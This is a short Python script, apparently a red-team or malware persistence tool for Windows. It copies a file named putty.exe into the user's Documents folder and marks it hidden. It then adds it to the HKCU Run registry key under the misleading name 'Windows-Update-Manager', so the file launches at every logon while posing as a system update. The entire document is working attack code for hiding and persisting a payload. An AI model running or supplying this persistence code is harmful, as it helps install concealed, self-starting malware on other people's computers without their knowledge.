#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import shutil
import ctypes
import winreg

FILENAME = 'putty.exe'

path = os.getcwd() + '\\'
userprofile = os.getenv('userprofile')
source = path + FILENAME
destination = userprofile + '\\Documents\\' + FILENAME

print('[+] System recon')
print(f'\t[|] Working directory: {path}')
print(f'\t[|] User profile: {userprofile}')
print(f'\t[|] Source: {source}')
print(f'\t[|] Destination: {destination}')

if os.path.exists(destination):
    print('\n[X] System already touched, nothing to do...')
    exit(0)
else:
    print(f'[+] Persisting file: {FILENAME}')
    shutil.copyfile(source, destination)
    print('\t[+] File copy complete')

    ctypes.windll.kernel32.SetFileAttributesW(destination, 0x02)
    print('\t[+] File hiding complete')

    with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_ALL_ACCESS
    ) as key:
        winreg.SetValueEx(
            key,
            'Windows-Update-Manager',
            0,
            winreg.REG_SZ, destination
        )
    print('\t[+] Register udpate..')
